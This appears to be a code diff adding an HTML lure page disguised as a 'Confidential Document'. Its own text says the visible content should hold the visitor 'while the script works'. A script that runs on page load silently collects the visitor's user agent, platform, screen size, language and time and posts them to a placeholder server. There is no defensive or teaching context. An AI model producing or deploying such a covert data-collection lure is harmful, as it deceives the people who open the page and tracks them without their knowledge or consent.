@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shared Document</title>
+    <style>
+        body { font-family: 'Georgia', serif; line-height: 1.6; padding: 40px; max-width: 800px; margin: auto; background-color: #fdfdfd; }
+        .doc-container { background: white; padding: 50px; border: 1px solid #ddd; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <h1>Confidential Document</h1>
+        <p>This is where you write the actual content the person will see. You can make it look like a formal letter, a report, or any information that will make them stay on the page for a few seconds while the script works.</p>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore ullamco...</p>
+    </div>
+
+    <script>
+        async function gatherDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timestamp: new Date().toISOString()
+            };
+
+            // This sends the data to your server
+            try {
+                await fetch('https://your-server-url.com/log-device', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
+            } catch (e) {
+                console.log("Server not found");
+            }
+        }
+        gatherDeviceInfo();
+    </script>
+</body>
+</html>
